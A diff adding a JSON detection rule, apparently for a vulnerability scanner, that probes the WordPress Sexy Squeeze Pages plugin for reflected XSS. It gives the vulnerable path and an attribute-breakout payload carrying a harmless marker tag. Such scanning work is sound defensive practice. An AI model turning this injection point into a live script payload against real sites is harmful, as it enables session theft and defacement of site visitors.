@@ -1,0 +1,23 @@
+{
+    "target":"wordpress",
+    "meta":{
+        "name":    "WordPress Sexy Squeeze Pages Plugin XSS",
+        "remarks": "WordPress Sexy Squeeze Pages Plugin 存在反射型XSS漏洞",
+        "level":   3,
+        "type":    "XSS",
+        "author":   "wolf",
+        "references": {
+            "url":"",
+            "cve":"",
+            "kpid":"KP-0072"
+        }
+    },
+    "request":{
+        "path":     "/wp-content/plugins/instasqueeze/lp/index.php?id=\"/><test>test(666)</test>",
+        "postData": ""
+    },
+    "verify":{
+        "type":  "string",
+        "match": "/><test>test(666)</test>"
+    }
+}
